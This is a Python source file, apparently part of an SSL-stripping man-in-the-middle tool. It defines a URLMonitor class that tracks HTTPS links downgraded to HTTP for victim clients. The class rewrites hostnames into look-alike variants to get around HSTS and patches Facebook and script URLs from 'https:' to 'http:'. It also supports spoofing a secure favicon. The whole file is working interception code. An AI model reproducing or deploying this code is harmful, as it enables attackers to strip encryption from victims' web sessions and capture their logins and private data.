#  URLMonitor

import re
import logging
from configobj import ConfigObj

class URLMonitor:    

    '''
    The URL monitor maintains a set of (client, url) tuples that correspond to requests which the
    server is expecting over SSL.  It also keeps track of secure favicon urls.
    '''

    # Start the arms race, and end up here...
    javascriptTrickery = [re.compile("http://.+\.etrade\.com/javascript/omntr/tc_targeting\.html")]
    _instance          = None
    sustitucion 	   = {} # LEO: diccionario host / sustitucion
    real		   = {} # LEO: diccionario host / real
    patchDict	   = {
    		'https:\/\/fbstatic-a.akamaihd.net':'http:\/\/webfbstatic-a.akamaihd.net',
    		'https:\/\/www.facebook.com':'http:\/\/social.facebook.com',
    		'return"https:"':'return"http:"'
    		}

    def __init__(self):
        self.strippedURLs       = set()
        self.strippedURLPorts   = {}
        self.faviconReplacement = False

        hsts_config = ConfigObj("./config_files/hsts_bypass.cfg")

        for k,v in hsts_config.items():
            self.sustitucion[k] = v
            self.real[v] = k
            
    def isSecureLink(self, client, url):
        for expression in URLMonitor.javascriptTrickery:
            if (re.match(expression, url)):
                return True

        return (client,url) in self.strippedURLs

    def getSecurePort(self, client, url):
        if (client,url) in self.strippedURLs:
            return self.strippedURLPorts[(client,url)]
        else:
            return 443

    def addSecureLink(self, client, url):
        methodIndex = url.find("//") + 2
        method      = url[0:methodIndex]
        pathIndex   = url.find("/", methodIndex)
        host        = url[methodIndex:pathIndex].lower()
        path        = url[pathIndex:]

        port        = 443
        portIndex   = host.find(":")

        if (portIndex != -1):
            host = host[0:portIndex]
            port = host[portIndex+1:]
            if len(port) == 0:
                port = 443

		#LEO: Sustituir HOST
        if not self.sustitucion.has_key(host):
        	lhost = host[:4]
        	if lhost=="www.":
        		self.sustitucion[host] = "w"+host
        		self.real["w"+host] = host
        	else:
        		self.sustitucion[host] = "web"+host
        		self.real["web"+host] = host
        	#logging.info("LEO: ssl host      (%s) tokenized (%s)" % (host,self.sustitucion[host]) )
        		
        url = 'http://' + host + path
        #logging.debug("LEO stripped URL: %s %s"%(client, url))
		
        self.strippedURLs.add((client, url))
        self.strippedURLPorts[(client, url)] = int(port)
        return 'http://'+self.sustitucion[host]+path

    def setFaviconSpoofing(self, faviconSpoofing):
        self.faviconSpoofing = faviconSpoofing

    def isFaviconSpoofing(self):
        return self.faviconSpoofing

    def isSecureFavicon(self, client, url):
        return ((self.faviconSpoofing == True) and (url.find("favicon-x-favicon-x.ico") != -1))

    def URLgetRealHost(self,host):
    	logging.debug("Parsing host: %s"%host)
    	if self.real.has_key(host):
    		logging.debug("New host: %s"%self.real[host])
    		return self.real[host]
    	else:
    		logging.debug("New host: %s"%host)
    		return host

    def getInstance():
        if URLMonitor._instance == None:
            URLMonitor._instance = URLMonitor()

        return URLMonitor._instance

    getInstance = staticmethod(getInstance)
